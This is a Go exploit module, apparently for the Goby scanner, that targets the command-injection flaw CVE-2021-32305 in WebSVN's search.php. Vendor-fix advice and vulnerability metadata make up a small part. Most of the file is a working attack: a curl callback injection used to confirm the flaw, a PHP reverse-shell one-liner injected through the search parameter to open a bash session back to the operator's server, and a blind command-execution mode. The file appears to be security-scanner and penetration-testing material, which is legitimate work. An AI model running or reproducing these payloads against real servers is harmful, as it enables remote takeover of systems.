package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Websvn 2.6.0 version search.php file RCE (CVE-2021-32305)",
    "Description": "<p>websvn is an application software. An online Subversion repository browser.</p><p>WebSVN versions earlier than 2.6.1 have an arbitrary command execution vulnerability. An attacker can execute arbitrary commands through the search parameter to obtain server permissions.</p>",
    "Impact": "<p>Websvn 2.6.0 RCE (CVE-2021-32305)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/websvnphp/websvn\">https://github.com/websvnphp/websvn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Websvn",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Websvn 2.6.0 版本 search.php 文件任意命令执行漏洞（CVE-2021-32305）",
            "Product": "Websvn",
            "Description": "<p>websvn是一个应用软件。一个在线Subversion存储库浏览器。</p><p>WebSVN 2.6.1之前版本存在任意命令执行漏洞漏洞，攻击者通过search参数执行任意命令，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/websvnphp/websvn\">https://github.com/websvnphp/websvn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>WebSVN 2.6.1之前版本存在任意命令执行漏洞漏洞，攻击者通过search参数执行任意命令，获取服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Websvn 2.6.0 version search.php file RCE (CVE-2021-32305)",
            "Product": "Websvn",
            "Description": "<p>websvn is an application software. An online Subversion repository browser.</p><p>WebSVN versions earlier than 2.6.1 have an arbitrary command execution vulnerability. An attacker can execute arbitrary commands through the search parameter to obtain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/websvnphp/websvn\">https://github.com/websvnphp/websvn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Websvn 2.6.0 RCE (CVE-2021-32305)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"./templates/calm/images/favicon.ico\"",
    "GobyQuery": "body=\"./templates/calm/images/favicon.ico\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/websvnphp/websvn",
    "DisclosureDate": "2021-05-04",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202105-1210"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-32305"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202105-1210"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_php,blind_rce",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "curl xxx.dnslog.cn",
            "show": "AttackType=blind_rce"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10251"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri1 := fmt.Sprintf("/search.php?search=%%22;curl+%s;%%22", checkUrl)
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg1)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["AttackType"].(string)
			if attackType == "goby_shell_php" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);passthru("bash <&3 >&3 2>&3");'`, godclient.GetGodServerHost(), rp)
					uri := fmt.Sprintf("/search.php?search=%%22;%s;%%22", url.QueryEscape(cmd))
					cfg := httpclient.NewGetRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			} else if attackType == "blind_rce" {
				cmd := ss.Params["cmd"].(string)
				uri := fmt.Sprintf("/search.php?search=%%22;%s;%%22", url.QueryEscape(cmd))
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = "it is a blind rce, see your dnslog\n\n" + resp.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
